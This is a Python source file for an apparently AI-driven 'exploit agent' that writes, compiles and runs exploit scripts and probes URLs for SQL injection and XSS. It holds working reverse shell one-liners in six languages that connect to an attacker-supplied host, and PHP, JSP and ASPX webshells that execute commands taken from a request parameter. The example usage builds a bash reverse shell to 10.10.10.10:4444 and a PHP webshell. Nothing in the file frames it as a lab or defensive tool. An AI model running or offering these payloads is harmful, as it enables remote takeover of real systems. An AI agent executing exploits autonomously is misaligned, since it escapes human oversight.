#!/usr/bin/env python3
"""
dLNk GPT Exploit Agent System
Autonomous agent for exploit development, testing, and execution
"""

import os
import sys
import subprocess
import requests
import json
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
import tempfile
import shutil

@dataclass
class ExploitResult:
    """Result of exploit execution"""
    success: bool
    output: str
    error: str = ""
    metadata: Dict[str, Any] = None

class ExploitAgent:
    """
    Autonomous agent for exploit development and execution
    Capabilities:
    - Write exploit code
    - Execute exploits
    - Test payloads
    - Generate reports
    """
    
    def __init__(self, workspace_dir: str = "/tmp/exploit_workspace"):
        self.workspace = workspace_dir
        self.setup_workspace()
        
    def setup_workspace(self):
        """Initialize workspace for exploit operations"""
        if os.path.exists(self.workspace):
            shutil.rmtree(self.workspace)
        os.makedirs(self.workspace, exist_ok=True)
        
        # Create subdirectories
        os.makedirs(f"{self.workspace}/exploits", exist_ok=True)
        os.makedirs(f"{self.workspace}/payloads", exist_ok=True)
        os.makedirs(f"{self.workspace}/results", exist_ok=True)
        os.makedirs(f"{self.workspace}/tools", exist_ok=True)
        
    def write_exploit(self, code: str, filename: str, language: str = "python") -> str:
        """Write exploit code to file"""
        ext_map = {
            "python": ".py",
            "bash": ".sh",
            "php": ".php",
            "ruby": ".rb",
            "perl": ".pl",
            "c": ".c",
            "cpp": ".cpp"
        }
        
        ext = ext_map.get(language, ".txt")
        filepath = f"{self.workspace}/exploits/{filename}{ext}"
        
        with open(filepath, 'w') as f:
            f.write(code)
        
        # Make executable if script
        if language in ["bash", "python", "ruby", "perl"]:
            os.chmod(filepath, 0o755)
        
        return filepath
    
    def execute_python_exploit(self, filepath: str, args: List[str] = None) -> ExploitResult:
        """Execute Python exploit"""
        try:
            cmd = ["python3", filepath]
            if args:
                cmd.extend(args)
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=self.workspace
            )
            
            return ExploitResult(
                success=result.returncode == 0,
                output=result.stdout,
                error=result.stderr,
                metadata={"returncode": result.returncode}
            )
        except subprocess.TimeoutExpired:
            return ExploitResult(
                success=False,
                output="",
                error="Execution timeout (30s)",
                metadata={"timeout": True}
            )
        except Exception as e:
            return ExploitResult(
                success=False,
                output="",
                error=str(e),
                metadata={"exception": type(e).__name__}
            )
    
    def execute_bash_exploit(self, filepath: str, args: List[str] = None) -> ExploitResult:
        """Execute Bash exploit"""
        try:
            cmd = ["bash", filepath]
            if args:
                cmd.extend(args)
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=self.workspace
            )
            
            return ExploitResult(
                success=result.returncode == 0,
                output=result.stdout,
                error=result.stderr,
                metadata={"returncode": result.returncode}
            )
        except Exception as e:
            return ExploitResult(
                success=False,
                output="",
                error=str(e)
            )
    
    def test_sql_injection(self, url: str, param: str, payloads: List[str]) -> Dict[str, Any]:
        """Test SQL injection payloads"""
        results = {
            "url": url,
            "param": param,
            "vulnerable_payloads": [],
            "tested": 0,
            "vulnerable": False
        }
        
        for payload in payloads:
            try:
                params = {param: payload}
                response = requests.get(url, params=params, timeout=5)
                
                # Check for SQL errors
                sql_errors = [
                    "SQL syntax",
                    "mysql_fetch",
                    "Warning: mysql",
                    "ORA-",
                    "PostgreSQL",
                    "SQLite",
                    "SQLSTATE"
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        results["vulnerable_payloads"].append({
                            "payload": payload,
                            "error": error,
                            "response_length": len(response.text)
                        })
                        results["vulnerable"] = True
                        break
                
                results["tested"] += 1
            except Exception as e:
                continue
        
        return results
    
    def test_xss(self, url: str, param: str, payloads: List[str]) -> Dict[str, Any]:
        """Test XSS payloads"""
        results = {
            "url": url,
            "param": param,
            "reflected_payloads": [],
            "tested": 0,
            "vulnerable": False
        }
        
        for payload in payloads:
            try:
                params = {param: payload}
                response = requests.get(url, params=params, timeout=5)
                
                # Check if payload is reflected
                if payload in response.text:
                    results["reflected_payloads"].append({
                        "payload": payload,
                        "reflected": True,
                        "context": self._extract_context(response.text, payload)
                    })
                    results["vulnerable"] = True
                
                results["tested"] += 1
            except Exception as e:
                continue
        
        return results
    
    def _extract_context(self, html: str, payload: str, context_size: int = 100) -> str:
        """Extract context around reflected payload"""
        try:
            index = html.find(payload)
            if index == -1:
                return ""
            
            start = max(0, index - context_size)
            end = min(len(html), index + len(payload) + context_size)
            
            return html[start:end]
        except:
            return ""
    
    def generate_reverse_shell(self, lhost: str, lport: int, shell_type: str = "bash") -> str:
        """Generate reverse shell payload"""
        shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "nc": f"nc -e /bin/bash {lhost} {lport}",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        }
        
        return shells.get(shell_type, shells["bash"])
    
    def generate_webshell(self, shell_type: str = "php") -> str:
        """Generate webshell code"""
        webshells = {
            "php": """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>""",
            "jsp": """<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
}
%>""",
            "aspx": """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    string cmd = Request["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
</script>"""
        }
        
        return webshells.get(shell_type, webshells["php"])
    
    def compile_c_exploit(self, source_file: str, output_file: str = None) -> ExploitResult:
        """Compile C exploit"""
        if output_file is None:
            output_file = source_file.replace('.c', '')
        
        try:
            result = subprocess.run(
                ["gcc", source_file, "-o", output_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return ExploitResult(
                success=result.returncode == 0,
                output=f"Compiled to: {output_file}",
                error=result.stderr,
                metadata={"output_file": output_file}
            )
        except Exception as e:
            return ExploitResult(
                success=False,
                output="",
                error=str(e)
            )
    
    def save_result(self, result: ExploitResult, filename: str):
        """Save exploit result to file"""
        result_path = f"{self.workspace}/results/{filename}.json"
        
        result_dict = {
            "success": result.success,
            "output": result.output,
            "error": result.error,
            "metadata": result.metadata or {}
        }
        
        with open(result_path, 'w') as f:
            json.dump(result_dict, f, indent=2)
        
        return result_path
    
    def cleanup(self):
        """Clean up workspace"""
        if os.path.exists(self.workspace):
            shutil.rmtree(self.workspace)

# Example usage
if __name__ == "__main__":
    agent = ExploitAgent()
    
    # Example: Write and execute Python exploit
    exploit_code = """#!/usr/bin/env python3
import sys

def main():
    print("[*] Exploit executed successfully")
    print("[+] Target compromised")
    return 0

if __name__ == "__main__":
    sys.exit(main())
"""
    
    filepath = agent.write_exploit(exploit_code, "test_exploit", "python")
    print(f"[+] Exploit written to: {filepath}")
    
    result = agent.execute_python_exploit(filepath)
    print(f"[*] Execution result:")
    print(f"    Success: {result.success}")
    print(f"    Output: {result.output}")
    
    # Save result
    result_path = agent.save_result(result, "test_exploit_result")
    print(f"[+] Result saved to: {result_path}")
    
    # Generate reverse shell
    reverse_shell = agent.generate_reverse_shell("10.10.10.10", 4444, "bash")
    print(f"[+] Reverse shell payload: {reverse_shell}")
    
    # Generate webshell
    webshell = agent.generate_webshell("php")
    print(f"[+] Webshell generated")
    
    # Cleanup
    # agent.cleanup()
